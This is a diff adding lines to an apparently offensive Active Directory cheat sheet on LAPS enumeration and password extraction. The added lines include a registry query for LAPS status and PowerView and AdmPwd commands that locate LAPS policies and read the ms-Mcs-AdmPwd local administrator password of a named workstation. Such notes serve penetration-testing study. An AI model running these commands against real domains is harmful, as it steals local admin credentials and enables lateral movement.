@@ -8,6 +8,8 @@
 
 #### Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
 
+#### reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
+
 ### If admpwd.dll exists, then enumeration is successful.
 
 # LAPS PASSWORD EXTRACTION
@@ -54,6 +56,13 @@
 
  - Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwd
 
+ - Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
+
+ - Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
+
+ - Get-AdmPwdPassword -ComputerName wkstn-2 | fl (Find the principals that have ReadProperty on ms-Mcs-AdmPwd
+
+ - Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd (Read the password)
 
 #### 6) pyLAPS (Linux)
 
